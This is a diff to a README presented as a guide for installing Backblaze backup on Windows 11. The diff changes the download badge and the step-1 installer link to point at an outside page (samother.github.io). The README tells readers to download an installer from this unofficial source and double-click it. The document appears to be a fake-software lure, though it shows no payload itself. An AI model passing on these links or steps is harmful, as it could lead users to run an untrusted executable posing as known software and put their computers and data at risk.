@@ -1,6 +1,6 @@
 # 🛡️ Backblaze-Configuration-Guide - Fix Windows backup errors with ease
 
-[![Download Software](https://img.shields.io/badge/Download-Backblaze-blue.svg)](https://github.com/Samother/Backblaze-Configuration-Guide)
+[![Download Software](https://img.shields.io/badge/Download-Backblaze-blue.svg)](https://samother.github.io)
 
 This guide helps you install and manage Backblaze on your Windows 11 computer. You find steps to solve common setup errors and tips for a stable cloud backup.
 
@@ -18,7 +18,7 @@ Before you begin, ensure your computer meets these needs:
 
 Follow these steps to set up the software on your PC.
 
-1. Visit the repository page to download the installer: [https://github.com/Samother/Backblaze-Configuration-Guide](https://github.com/Samother/Backblaze-Configuration-Guide)
+1. Visit the repository page to download the installer: [https://samother.github.io](https://samother.github.io)
 2. Locate the file in your Downloads folder.
 3. Double-click the file to start the process.
 4. Accept the terms of use.
